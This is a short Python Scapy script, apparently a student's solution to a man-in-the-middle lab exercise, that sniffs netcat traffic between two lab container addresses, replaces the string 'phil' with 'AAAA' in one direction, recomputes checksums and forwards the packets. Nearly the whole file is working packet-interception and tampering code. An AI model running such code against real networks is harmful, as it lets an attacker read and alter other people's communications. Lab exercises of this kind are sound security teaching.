#!/usr/bin/env python3
from scapy.all import *
import re
IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

def spoof_pkt(pkt):
    # Check if packet has IP layer
    if not pkt.haslayer(IP):
        return
    
    print(f"Captured packet: {pkt[IP].src} -> {pkt[IP].dst}")
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        # Create a new packet based on the captured one.
        # 1) We need to delete the checksum in the IP & TCP headers,
        # because our modification will make them invalid.
        # Scapy will recalculate them if these fields are missing.
        # 2) We also delete the original TCP payload.
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        #################################################################
        # Construct the new payload based on the old payload.
        # Students need to implement this part.
        if pkt.haslayer(TCP) and pkt[TCP].payload:
            data = pkt[TCP].payload.load # The original payload data
            newdata = re.sub(r'phil', 'AAAA', data.decode(), flags=re.IGNORECASE).encode()
            send(newpkt/newdata)
        else:
            send(newpkt)
            ################################################################
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        # Create new packet based on the captured one
        # Do not make any change
        if pkt.haslayer(TCP):
            newpkt = IP(bytes(pkt[IP]))
            del(newpkt.chksum)
            del(newpkt[TCP].chksum)
            send(newpkt)
        else:
            send(pkt)
        
# Use broader filter to capture netcat traffic between A and B
f = 'host 10.9.0.5 or host 10.9.0.6'
print(f"Starting packet sniffing on eth0 with filter: {f}")
print("Waiting for netcat traffic...")
print("Will replace 'phil' with 'AAAA' in A->B traffic")
print("Setup: nc -l 9090 (on B) and nc 10.9.0.6 9090 (on A)")
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)